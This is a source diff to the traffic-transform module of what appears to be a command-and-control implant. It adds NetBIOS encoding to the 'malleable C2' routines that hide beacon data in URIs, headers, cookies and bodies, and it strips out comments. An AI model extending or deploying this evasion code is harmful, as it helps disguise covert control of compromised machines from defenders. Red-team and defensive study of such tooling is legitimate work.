@@ -26,6 +26,8 @@
 #define TRANSFORM__COOKIE 0xB           // Additional cookie header value (no payload)
 #define TRANSFORM__BODY 0xC             // Probably don't need this
 #define TRANSFORM__HOSTHEADER 0xD       // not implemented yet
+#define TRANSFORM_NETBIOS 0xE           
+#define TRANSFORM_NETBIOSU 0xF          
 
 // Initialize a transform struct
 BOOL TransformInit(TRANSFORM* transform, SIZE_T maxSize)
@@ -59,7 +61,7 @@ BOOL TransformInit(TRANSFORM* transform, SIZE_T maxSize)
     return TRUE;
 }
 
-// Apply malleable C2 modifications to the web request
+/* Apply malleable C2 modifications to the web request */
 BOOL TransformApply(TRANSFORM* transform, PBYTE bufferIn, UINT32 bufferLen, unsigned char* reqProfile)
 {
 #define MAX_PARAM 1024
@@ -87,17 +89,15 @@ BOOL TransformApply(TRANSFORM* transform, PBYTE bufferIn, UINT32 bufferLen, unsi
         PCHAR   uri     = NULL; 
         SIZE_T  uriLen  = 0;
         if (i == ri) {
-            uri             = ParserStringCopy(&parser, &uriLen);   // null terminated
+            uri             = ParserStringCopy(&parser, &uriLen);   // allocates 
             selectedUri     = uri;
             // Don't break cause we need to shift parser through all data
         } else {
             // Still need to read off the data from the parser
             uri = ParserGetString(&parser, &uriLen);
         }
-        //_dbg("[TRANSFORM] FOUND URI nmbr %d \"%s\"", i + 1, uri);
     }
     
-    //_dbg("[TRANSFORM] Selected URI \"%s\"", selectedUri);
     snprintf(transform->uri, MAX_URI, "%s", selectedUri);
     LocalFree(selectedUri);
 
@@ -107,11 +107,10 @@ BOOL TransformApply(TRANSFORM* transform, PBYTE bufferIn, UINT32 bufferLen, unsi
 	{
 		switch (step)
 		{
-            // Base64 contents of payload
             case TRANSFORM_BASE64URL:
 			case TRANSFORM_BASE64:
 			{
-                // _dbg("[TRANSFORM_BASE64] Applying...");//DEBUG
+                // _dbg("[TRANSFORM_BASE64] Applying...");
 				
                 outlen = calculate_base64_encoded_size(transformedLength);
                 char* temp_encoded = (char *)LocalAlloc(LPTR, outlen + 1);
@@ -188,20 +187,32 @@ BOOL TransformApply(TRANSFORM* transform, PBYTE bufferIn, UINT32 bufferLen, unsi
                 memset(param, 0, sizeof(param));
                 ParserStringCopySafe(&parser, param, &len);
 
-                // Use transform->temp as the buffer for XORed data
                 if (!xor_encode((char*)transform->transformed, transformedLength, param, len, (char*)transform->temp)) {
                     _err("xor_encode transformation failed");
                     return FALSE;
                 }
 
-                if (transformedLength == 0) // size doesn't change for xor
+                if (transformedLength == 0)
 					return FALSE;
 
                 memset(transform->transformed, 0, transform->outputLength);
                 memcpy(transform->transformed, transform->temp, transformedLength);
                 break;
             }
-            // Prepends value to payload
+            case TRANSFORM_NETBIOS:
+			case TRANSFORM_NETBIOSU:
+            {
+                // _dbg("[TRANSFORM_NETBIOS] Applying...");
+                
+				transformedLength = to_netbios(step == TRANSFORM_NETBIOSU ? 'A' : 'a', transform->transformed, transformedLength, transform->temp, transform->outputLength);
+
+				if (transformedLength == 0)
+					return FALSE;
+
+				memset(transform->transformed, 0, transform->outputLength);
+				memcpy(transform->transformed, transform->temp, transformedLength);
+				break;
+            }
             case TRANSFORM_PREPEND:
             {
                 //_dbg("[TRANSFORM_PREPEND] Applying...");
@@ -218,7 +229,6 @@ BOOL TransformApply(TRANSFORM* transform, PBYTE bufferIn, UINT32 bufferLen, unsi
                 memcpy(transform->transformed, transform->temp, transformedLength);
                 break;
             }
-            // Appends value to payload
             case TRANSFORM_APPEND:
             {
                 //_dbg("[TRANSFORM_APPEND] Applying...");
@@ -230,7 +240,6 @@ BOOL TransformApply(TRANSFORM* transform, PBYTE bufferIn, UINT32 bufferLen, unsi
                 transformedLength += len;
                 break;
             }
-            // Arbitrary URL parameter (e.g., "?value=1235")
             case TRANSFORM__PARAMETER:
             {
                 //_dbg("[TRANSFORM__PARAMETER] Applying...");
@@ -246,7 +255,6 @@ BOOL TransformApply(TRANSFORM* transform, PBYTE bufferIn, UINT32 bufferLen, unsi
                 memcpy(transform->uriParams, transform->temp, MAX_URI_PARAMS);
 				break;
             }
-            // Arbitrary header (e.g., "Header-Custom: Xenon")
             case TRANSFORM__HEADER:
             {
                 //_dbg("[TRANSFORM__HEADER] Applying...");
@@ -258,7 +266,6 @@ BOOL TransformApply(TRANSFORM* transform, PBYTE bufferIn, UINT32 bufferLen, unsi
 				memcpy(transform->headers, transform->temp, MAX_HEADERS);
                 break;
             }
-            // Arbitrary Cookie header ("Cookie: value=1")
             case TRANSFORM__COOKIE:
             {
                 //_dbg("[TRANSFORM__COOKIE] Applying...");
@@ -271,13 +278,13 @@ BOOL TransformApply(TRANSFORM* transform, PBYTE bufferIn, UINT32 bufferLen, unsi
                 memcpy(transform->cookies, transform->temp, MAX_COOKIES);
                 break;
             }
-            // Arbitrary host header
-            case TRANSFORM__HOSTHEADER: // Not implemented
+            case TRANSFORM__HOSTHEADER:
             {
                 //_dbg("[TRANSFORM__HOSTHEADER] Applying...");
+                /* Custom host headers will be added under TRANSFORM_HEADER 
+                for now I don't feel the need to implement this */
                 break;
             }
-            // Payload goes in URL Parameter
             case TRANSFORM_PARAMETER:
             {
                 //_dbg("[TRANSFORM_PARAMETER] Applying...");
@@ -293,7 +300,6 @@ BOOL TransformApply(TRANSFORM* transform, PBYTE bufferIn, UINT32 bufferLen, unsi
                 memcpy(transform->uriParams, transform->temp, MAX_URI_PARAMS);
                 break;
             }
-            // Payload goes in Header
             case TRANSFORM_HEADER:
             {
                 //_dbg("[TRANSFORM_HEADER] Applying...");
@@ -306,7 +312,6 @@ BOOL TransformApply(TRANSFORM* transform, PBYTE bufferIn, UINT32 bufferLen, unsi
 				memcpy(transform->headers, transform->temp, MAX_HEADERS);
                 break;
             }
-            // Payload goes in Cookie. Any additional arbitrary cookies would've been added to transform already.
             case TRANSFORM_COOKIE:
             {
                 //_dbg("[TRANSFORM_COOKIE] Applying...");
@@ -320,21 +325,17 @@ BOOL TransformApply(TRANSFORM* transform, PBYTE bufferIn, UINT32 bufferLen, unsi
 				else
 					snprintf(transform->temp, MAX_TEMP, "Cookie: %s=%s\r\n", param, transform->transformed);
                 
-                // Combine arbitrary cookies and payload cookie
                 memcpy(transform->cookies, transform->temp, MAX_COOKIES);
 
-                // Add final cookie to headers
                 memset(transform->temp, 0, MAX_TEMP);
                 snprintf(transform->temp, MAX_TEMP, "%s%s", transform->headers, transform->cookies);
                 memcpy(transform->headers, transform->temp, MAX_HEADERS);
                 break;
             }
-            // Payload goes in Body
             case TRANSFORM_BODY:
             {
                 //_dbg("[TRANSFORM_BODY] Applying...");
 
-                // Set body pointer and size to final payload
                 transform->body = transform->transformed;
                 transform->bodyLength = transformedLength;
                 break;
@@ -345,7 +346,7 @@ BOOL TransformApply(TRANSFORM* transform, PBYTE bufferIn, UINT32 bufferLen, unsi
     return TRUE;
 }
 
-// Undo malleable C2 modifications from the server response
+/* Undo malleable C2 modifications from the server response */
 BOOL TransformReverse(char* recoverable, DWORD recoverableLength, SIZE_T* recoveredDataLen, unsigned char* resProfile, int maxGet)
 {
 
@@ -355,6 +356,7 @@ BOOL TransformReverse(char* recoverable, DWORD recoverableLength, SIZE_T* recove
 	if (temp == NULL)
 		return FALSE;
 
+    DWORD tempLen = recoverableLength;
 
     PARSER parser;
     ParserDataParse(&parser, resProfile, MAX_RESPONSE_PROFILE);
@@ -366,7 +368,6 @@ BOOL TransformReverse(char* recoverable, DWORD recoverableLength, SIZE_T* recove
     {
         switch (step)
         {
-        // case TRANSFORM_BASE64URL:
         case TRANSFORM_BASE64:
         {
             // _dbg("[REVERSE_BASE64] ...");
@@ -384,7 +385,7 @@ BOOL TransformReverse(char* recoverable, DWORD recoverableLength, SIZE_T* recove
             recoverableLength = outlen;
 
             if (recoverableLength == 0)
-					return FALSE;
+                return FALSE;
 
             memcpy(recoverable, temp, recoverableLength);
             break;
@@ -435,6 +436,21 @@ BOOL TransformReverse(char* recoverable, DWORD recoverableLength, SIZE_T* recove
             recoverable[recoverableLength] = 0;
             break;
         }
+        case TRANSFORM_NETBIOS:
+        case TRANSFORM_NETBIOSU:
+        {
+            // _dbg("[TRANSFORM_NETBIOS] Reversing...%d bytes", recoverableLength);
+
+            recoverable[recoverableLength] = 0;
+            recoverableLength = from_netbios(step == TRANSFORM_NETBIOSU ? 'A' : 'a', recoverable, recoverableLength, temp, maxGet);
+
+            if (recoverableLength == 0)
+                return FALSE;
+
+            memcpy(recoverable, temp, recoverableLength);
+            recoverable[recoverableLength] = 0;
+            break;
+        }
         case TRANSFORM_PREPEND:
         {
             //_dbg("[TRANSFORM_PREPEND] Reversing...");
@@ -467,7 +483,7 @@ BOOL TransformReverse(char* recoverable, DWORD recoverableLength, SIZE_T* recove
         }
     }
 
-    // Write recoverd data length to output variable
+    /* Write recoverd data length to output variable */
     *recoveredDataLen = recoverableLength;
 
     free(temp);
@@ -475,6 +491,7 @@ BOOL TransformReverse(char* recoverable, DWORD recoverableLength, SIZE_T* recove
     return TRUE;
 }
 
+/* Destroy transform struct */
 void TransformDestroy(TRANSFORM* transform)
 {
 	ParserDestroy(transform->parser);
